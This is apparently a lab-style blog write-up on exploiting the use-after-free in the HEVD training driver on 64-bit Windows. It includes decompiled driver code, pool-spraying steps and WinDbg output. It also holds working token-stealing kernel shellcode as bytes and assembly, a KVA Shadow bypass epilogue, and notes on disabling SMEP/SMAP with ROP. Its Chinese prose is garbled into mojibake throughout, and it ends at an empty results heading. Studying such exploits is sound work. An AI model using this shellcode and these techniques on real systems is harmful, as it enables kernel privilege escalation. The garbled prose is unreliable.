<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222013</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x222017</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">UseUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x22201B</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">FreeUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>NonPagedPoolï¼Œå…¶allocçš„å¤§å°ä¸º0x60</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PoolWithTag = (<span class="type">const</span> <span class="type">void</span> **)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x60</span>ui64, <span class="number">0x6B636148</span>u);</span><br></pre></td></tr></table></figure>

<p>æ€è·¯ï¼šUAFåŠ«æŒcallbackå‡½æ•°ï¼Œè®©å…¶æ‰§è¡Œææƒçš„ä»£ç ã€‚</p>
<h3 id="Exploit-NonPagedPool"><a href="#Exploit-NonPagedPool" class="headerlink" title="Exploit NonPagedPool"></a>Exploit NonPagedPool</h3><p>åŠ è½½é©±åŠ¨ï¼ŒæŸ¥çœ‹æ˜¯å¦åŠ è½½æˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; lm m H*</span><br></pre></td></tr></table></figure>

<p>æ‰“æ–­ç‚¹å’Œæ˜¾ç¤ºDbgPrintä¿¡æ¯</p>
<ul>
<li><code>DebugBreak()</code>Â åº”ç”¨ç¨‹åºè§¦å‘kenel debugæ–­ç‚¹</li>
</ul>
<p>æ‰“å°å‡ºæ‰€æœ‰çš„ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºå­˜åœ¨ <code>Tag</code> å¯ä»¥å¯»æ‰¾poolï¼Œæ¯”è¾ƒèŠ±æ—¶é—´ï¼Œå¯ä»¥åœ¨DebugViewé‡Œå¯»æ‰¾ä¿¡æ¯.<code>!poolfind</code> å‘½ä»¤ä¸ä¼šè®¡ç®—å¤´éƒ¨ï¼Œ<code>!pool</code> ä¼šè®¡ç®—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 Hack</span><br><span class="line">0: kd&gt; !poolfind Hack -nonpaged</span><br><span class="line">3: kd&gt; g</span><br><span class="line">***** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">[+] Allocating UaF Object</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x60</span><br><span class="line">[+] Pool Chunk: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree Object: 0xFFFFA78BEF702B50</span><br><span class="line">[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree-&gt;Callback: 0xFFFFF8012D287CD0</span><br><span class="line">****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">0033:00007ff9`b21bb6d2 cc              int     3</span><br><span class="line">1: kd&gt; !pool 0xFFFFA78BEF702B50</span><br><span class="line">Pool page ffffa78bef702b50 region is Nonpaged pool</span><br><span class="line"> ffffa78bef702000 size:   30 previous size:    0  (Free)       ....</span><br><span class="line"> # ...</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å†…å­˜ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: kd&gt; dq 0xFFFFA78BEF702B50</span><br><span class="line">ffffa78b`ef702b50  fffff801`2d287cd0 41414141`41414141</span><br><span class="line">ffffa78b`ef702b60  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b70  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b80  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b90  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702ba0  41414141`41414141 00000000`00414141</span><br><span class="line">ffffa78b`ef702bb0  fe8fc5c0`d7167489 00000000`00000000</span><br><span class="line">ffffa78b`ef702bc0  00000000`00000000 ffffa78b`ef714039</span><br></pre></td></tr></table></figure>


<p>pool å®é™…å¤§å°ï¼Œéœ€è¦åŠ å…¥ä¸€ä¸ªå¤´éƒ¨ä¿¡æ¯ï¼Œå¹¶ä¸”å†…å­˜å¯¹é½ã€‚pool header</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"></span><br><span class="line">1: kd&gt; !poolused 2 Hack</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">....</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"> Hack         1          112          0            0	UNKNOWN pooltag &#x27;Hack&#x27;, please update pooltag.txt</span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>å› æ­¤å®é™…è·å¾—çš„å¤§å°ï¼š0x70ï¼Œå†…å­˜å¯¹é½</p>
<p>å†…æ ¸æ± å–·å°„æ˜¯ä¸€é¡¹ä½¿æ± ä¸­åˆ†é…ä½ç½®å¯é¢„æµ‹çš„è‰ºæœ¯ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥çŸ¥é“ä¸€ä¸ªå—å°†è¢«åˆ†é…åˆ°å“ªé‡Œï¼Œå“ªäº›å—åœ¨å…¶é™„è¿‘ã€‚</p>
<ul>
<li>å¾®è½¯æœ‰ä¸€ä¸ª<a href="https://learn.microsoft.com/zh-cn/windows/win32/sysinfo/kernel-objects">å†…æ ¸å¯¹è±¡ - Win32 apps</a>åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨ç”¨æˆ·æ¨¡å¼åŠŸèƒ½æ¥åˆ›å»ºå†…æ ¸å¯¹è±¡ï¼Œ</li>
</ul>
<p>è§¦å‘UAFå‰ï¼Œéœ€è¦ä½¿ç”¨ heap fengshui</p>
<ul>
<li>å¯ä»¥ä¸å¸ƒå±€ï¼Œçœ‹æ¥å‡ ç¯‡æ–‡ç« ï¼Œç›´æ¥åˆ©ç”¨ <a href="https://blog.csdn.net/qq_36918532/article/details/123417458">(3)</a></li>
<li><code>NtAllocateReserveObject</code> å¸ƒå±€ï¼Œä½†æ˜¯åœ¨x64ä¸‹å¾—åˆ°é”™è¯¯çš„</li>
<li>x64ä¸‹å¯ä»¥ä½¿ç”¨<code>CreatePipe</code>å’Œ<code>WriteFile</code>æ¥è¿›è¡ŒNonPagedPoolå–·å°„ï¼Œç¼“å†²åŒºå¤§å°ï¼šPoolSize-HeaderSize(0x48)ï¼ŒNpFr tagã€‚<a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">(4)</a>[(5)](<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">Windows Kernel Exploitation â€“ HEVD x64 Use-After-Free â€¢ Vulndev</a>)</li>
</ul>
<p>freeåè¢«åˆå¹¶ï¼Œå› æ­¤ä¸ºäº†æé«˜æˆåŠŸç‡ï¼Œå°±åˆ›å»ºholeï¼Œç„¶åä½¿ç”¨æ¼æ´å¯¹è±¡è¿›è¡Œå ä½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*ffffa78bef702a30 size:  5b0 previous size:    0  (Free)      *...~</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒ<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">(6)</a>ï¼Œè·å¾—ä¸¤ä¸ªå¥æŸ„ <code>0xac, 0xb0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 NpFr</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">...</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"></span><br><span class="line"> NpFr         1          112          0            0	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>å†™å…¥UAFï¼Œå­˜åœ¨ä¸€ä¸ªFAKE_OBJECTï¼Œå¯ä»¥è¿›è¡Œå†™å…¥</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22201F</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">AllocateFakeObjectNonPagedPoolIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;</span><br><span class="line">  result = <span class="number">0xC0000001</span>;</span><br><span class="line">  <span class="keyword">if</span> ( Parameters )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">AllocateFakeObjectNonPagedPool</span>((_FAKE_OBJECT_NON_PAGED_POOL *)Parameters);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">AllocateFakeObjectNonPagedPool</span><span class="params">(_FAKE_OBJECT_NON_PAGED_POOL *UserFakeObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _OWORD *PoolWithTag; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Creating Fake Object\n&quot;</span>);</span><br><span class="line">  PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x5C</span>ui64, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( PoolWithTag )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="number">0x5C</span>ui64);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="built_in">ProbeForRead</span>(UserFakeObject, <span class="number">0x5C</span>ui64, <span class="number">1u</span>);</span><br><span class="line">    *PoolWithTag = *(_OWORD *)UserFakeObject-&gt;Buffer;</span><br><span class="line">    PoolWithTag[<span class="number">1</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">16</span>];</span><br><span class="line">    PoolWithTag[<span class="number">2</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">32</span>];</span><br><span class="line">    PoolWithTag[<span class="number">3</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">48</span>];</span><br><span class="line">    PoolWithTag[<span class="number">4</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">64</span>];</span><br><span class="line">    *((_QWORD *)PoolWithTag + <span class="number">10</span>) = *(_QWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">80</span>];</span><br><span class="line">    *((_DWORD *)PoolWithTag + <span class="number">22</span>) = *(_DWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">88</span>];</span><br><span class="line">    *((_BYTE *)PoolWithTag + <span class="number">91</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Fake Object: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225495</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰“ä¸¤ä¸ªæ–­ç‚¹ï¼ŒæˆåŠŸå†™å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFA78BF933D540</span><br><span class="line">ffffa78b`f933d540  00000000`deadbeef 00000000`00000000</span><br><span class="line">ffffa78b`f933d550  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d560  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d570  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d580  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d590  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5a0  6b636148`02070000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5b0  00000000`deadbeef 00000000`00000000</span><br></pre></td></tr></table></figure>

<h4 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h4><p>ä½¿ç”¨keystoneç”Ÿæˆæ±‡ç¼–</p>
<p>æˆ–è€…å‚è€ƒ<a href="https://github.com/vportal/HEVD/blob/main/HEVD_UAF_WIN10_21H2.cpp">HEVD&#x2F;HEVD_UAF_WIN10_21H2.cpp</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&#123; <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x9B</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xF9</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xE5</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0xC3</span> &#125;</span><br><span class="line"><span class="comment">// åæ±‡ç¼–</span></span><br><span class="line"><span class="number">0</span>: Â <span class="number">65</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">88</span> <span class="number">01</span> Â  Â mov Â  Â rax,QWORD PTR gs:<span class="number">0x188</span>  </span><br><span class="line"><span class="number">7</span>: Â <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"><span class="number">9</span>: Â <span class="number">48</span> <span class="number">8b</span> <span class="number">80</span> b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> Â  Â mov Â  Â rax,QWORD PTR [rax+<span class="number">0xb8</span>]  </span><br><span class="line"><span class="number">10</span>: <span class="number">48</span> <span class="number">89</span> c3 Â  Â  Â  Â  Â  Â  Â  Â mov Â  Â rbx,rax  </span><br><span class="line"><span class="number">13</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">9b</span> <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> Â  Â mov Â  Â rbx,QWORD PTR [rbx+<span class="number">0x448</span>]  </span><br><span class="line"><span class="number">1</span>a: <span class="number">48</span> <span class="number">81</span> eb <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> Â  Â sub Â  Â rbx,<span class="number">0x448</span>  </span><br><span class="line"><span class="number">21</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> <span class="number">40</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> Â  Â mov Â  Â rcx,QWORD PTR [rbx+<span class="number">0x440</span>]  </span><br><span class="line"><span class="number">28</span>: <span class="number">48</span> <span class="number">83</span> f9 <span class="number">04</span> Â  Â  Â  Â  Â  Â  cmp Â  Â rcx,<span class="number">0x4</span>  </span><br><span class="line"><span class="number">2</span>c: <span class="number">75</span> e5 Â  Â  Â  Â  Â  Â  Â  Â  Â  jne Â  Â <span class="number">0x13</span>  </span><br><span class="line"><span class="number">2</span>e: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> Â  Â mov Â  Â rcx,QWORD PTR [rbx+<span class="number">0x4b8</span>]</span><br><span class="line"><span class="number">35</span>: <span class="number">80</span> e1 f0 Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">and</span> Â  Â cl,<span class="number">0xf0</span>  </span><br><span class="line"><span class="number">38</span>: <span class="number">48</span> <span class="number">89</span> <span class="number">88</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> Â  Â mov Â  Â QWORD PTR [rax+<span class="number">0x4b8</span>],rcx  </span><br><span class="line"><span class="number">3f</span>: <span class="number">48</span> <span class="number">31</span> c0 Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">xor</span> Â  Â rax,rax  </span><br><span class="line"><span class="number">42</span>: c3 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â ret</span><br></pre></td></tr></table></figure>

<p>æ˜¯å†™æˆåŠŸäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFDC04FE779850</span><br><span class="line">ffffdc04`fe779850  00018825`048b4865 000000b8`808b4800</span><br><span class="line">ffffdc04`fe779860  04489b8b`48c38948 000448eb`81480000</span><br><span class="line">ffffdc04`fe779870  00000440`8b8b4800 8b48e575`04f98348</span><br><span class="line">ffffdc04`fe779880  f0e18000`0004b88b 48000004`b8888948</span><br><span class="line">ffffdc04`fe779890  00000000`00c3c031 00007ff7`85ad32d8</span><br><span class="line">ffffdc04`fe7798a0  00000000`00000000 00000000`00413f2e</span><br><span class="line">ffffdc04`fe7798b0  6b636148`02070000 61005400`00000000</span><br><span class="line">ffffdc04`fe7798c0  00018825`048b4865 000000b8`808b4800</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç›´æ¥å†™æ— æ³•è¿è¡Œï¼Œæ— æ³•ææƒï¼šä¿æŠ¤æœºåˆ¶çš„ç»•è¿‡ã€‚</p>
<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>bypass KASLR: è·å–å†…æ ¸åŸºå€ <code>ntoskrnl.exe</code> åœ°å€ï¼šéå†é©±åŠ¨ï¼Œè·å–å†…æ ¸åŸºå€<br>bypass SEMP&#x2F;SMAP: ä¿®æ”¹CR4å¯„å­˜å™¨ï¼Œå°†20ï¼Œ21ä½ç½®0<br>bypass KVA Sahdow: å†…æ ¸é¡µè¡¨éš”ç¦»KVA(KPTI)ï¼Œä¹Ÿå°±æ˜¯<a href="https://alvinovo.top/post/memory-page-table-isolation/#3-1-KVA-Shadow">KVA Shadow</a>ï¼Œå½“æ‰§è¡Œå†…æ ¸ä»£ç æ—¶ï¼Œç”¨æˆ·æ€ä»£ç è®°å½•ä¸º <code>NX</code></p>
<ul>
<li>AllocPoolWithTag è·å¾—çš„å†…å­˜ä¸€èˆ¬æ˜¯å¯æ‰§è¡Œçš„ï¼Œå› æ­¤å¯ä»¥å¾€å†…å­˜ä¸­å†™ï¼Œç„¶åæ‰§è¡Œ</li>
<li>æ‰§è¡Œ<code>swapgs</code>ç»•è¿‡</li>
</ul>
<p>å¦‚æœCR4å¯„å­˜å™¨çš„ç¬¬20ä½è¢«è®¾ç½®ä¸º1ï¼Œé‚£ä¹ˆå°±å¯ç”¨äº†SMEPï¼›21ä½smap <a href="https://www.cnblogs.com/HcyRcer/p/16559321.html">Cr0-Cr4</a>ã€‚è¿™é‡Œçœ‹åˆ°smepï¼Œsmapéƒ½å­˜åœ¨ã€‚SMEPå­˜åœ¨å°±å¯ä»¥æ‰§è¡Œç”¨æˆ·æ€ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2: kd&gt; r cr4</span><br><span class="line">cr4=0000000000350ef8</span><br><span class="line">2: kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     00000000`00350ef8</span><br><span class="line">  Decimal: 3477240</span><br><span class="line">  Decimal (unsigned) : 3477240</span><br><span class="line">  Octal:   0000000000000015207370</span><br><span class="line">  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000</span><br><span class="line">  Chars:   .....5..</span><br><span class="line">  Time:    Tue Feb 10 13:54:00 1970</span><br><span class="line">  Float:   low 4.87265e-039 high 0</span><br><span class="line">  Double:  1.71798e-317</span><br></pre></td></tr></table></figure>

<p>å¯»æ‰¾ROPï¼šä½¿ç”¨ropper&#x2F;ROPgadgetå·¥å…·ï¼Œåœ¨ <code>ntoskrnl.exe</code> å¯»æ‰¾</p>
<ul>
<li><code>C:\Windows\WinSxS\amd64_microsoft-windows-os-kernelxxx\ntoskrnl.exe</code></li>
</ul>
<p>å¯»æ‰¾gadget</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; imagebase <span class="number">0</span>x0</span><br><span class="line">[INFO] Imagebase <span class="built_in">set</span> to <span class="number">0</span>x0</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search mov cr4, r</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒï¼š<a href="https://vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation x64 Stack Overflow </a>ä¸ºäº†ä¸å´©æºƒï¼Œshellcodeéœ€è¦æ·»åŠ bypass KVA Shadowã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line">start:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; KPCRB.<span class="built_in">CurrentThread</span> (_KTHREAD)</span><br><span class="line">  mov rax, [rax + <span class="number">0xb8</span>]     ; APCState.<span class="built_in">Process</span> (current _EPROCESS)</span><br><span class="line">  mov r8, rax               ; Store current _EPROCESS ptr in RBX</span><br><span class="line"> </span><br><span class="line">loop:</span><br><span class="line">  mov r8, [r8 + <span class="number">0x448</span>]      ; ActiveProcessLinks</span><br><span class="line">  sub r8, <span class="number">0x448</span>             ; Go back to start of _EPROCESS</span><br><span class="line">  mov r9, [r8 + <span class="number">0x440</span>]      ; <span class="built_in">UniqueProcessId</span> (PID)</span><br><span class="line">  cmp r9, <span class="number">4</span>                 ; SYSTEM PID? </span><br><span class="line">  jnz loop                  ; Loop until PID == <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">replace:</span><br><span class="line">  mov rcx, [r8 + <span class="number">0x4b8</span>]      ; Get SYSTEM token</span><br><span class="line">  <span class="keyword">and</span> cl, <span class="number">0xf0</span>               ; Clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">  mov [rax + <span class="number">0x4b8</span>], rcx     ; Copy SYSTEM token to current process</span><br><span class="line"> </span><br><span class="line">cleanup:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; _KPCR.Prcb.CurrentThread</span><br><span class="line">  mov cx, [rax + <span class="number">0x1e4</span>]     ; KTHREAD.KernelApcDisable</span><br><span class="line">  inc cx</span><br><span class="line">  mov [rax + <span class="number">0x1e4</span>], cx</span><br><span class="line">  mov rdx, [rax + <span class="number">0x90</span>]     ; ETHREAD.TrapFrame</span><br><span class="line">  mov rcx, [rdx + <span class="number">0x168</span>]    ; ETHREAD.TrapFrame.Rip</span><br><span class="line">  mov r11, [rdx + <span class="number">0x178</span>]    ; ETHREAD.TrapFrame.EFlags</span><br><span class="line">  mov rsp, [rdx + <span class="number">0x180</span>]    ; ETHREAD.TrapFrame.Rsp</span><br><span class="line">  mov rbp, [rdx + <span class="number">0x158</span>]    ; ETHREAD.TrapFrame.Rbp</span><br><span class="line">  <span class="keyword">xor</span> eax, eax  ;</span><br><span class="line">  swapgs</span><br><span class="line">  o64 sysret </span><br></pre></td></tr></table></figure>

<p>æŸä¸ªåœ°å€è¯»å†™ï¼Œæ–­ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; ba e1 &lt;ObjectAddr&gt;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆç»“æœ</p>
